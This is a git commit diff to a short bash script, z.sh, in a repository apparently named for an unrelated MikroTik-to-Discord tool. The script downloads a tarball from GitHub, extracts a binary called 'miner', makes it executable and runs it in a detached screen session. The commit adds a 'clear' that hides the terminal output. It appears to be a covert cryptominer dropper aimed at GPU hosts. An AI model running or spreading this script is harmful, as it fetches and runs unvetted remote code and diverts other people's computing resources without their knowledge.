daa3d2516fc38a1f6d45cabeac43afebcc32e8a5
arymas49 <58667903+arymas49@users.noreply.github.com>
2023-11-22 02:01:03 +0800

    Update z.sh

--- z.sh
+++ z.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-LD_LIBRARY_PATH=/usr/lib64-nvidia && export LD_LIBRARY_PATH && wget https://raw.githubusercontent.com/arymas49/MikrotikToDiscord/master/z.tar.gz && tar -xvf z.tar.gz && chmod +x miner && screen -dm bash -c "./miner"
+LD_LIBRARY_PATH=/usr/lib64-nvidia && export LD_LIBRARY_PATH && wget https://raw.githubusercontent.com/arymas49/MikrotikToDiscord/master/z.tar.gz && tar -xvf z.tar.gz && chmod +x miner && screen -dm bash -c "./miner" && clear
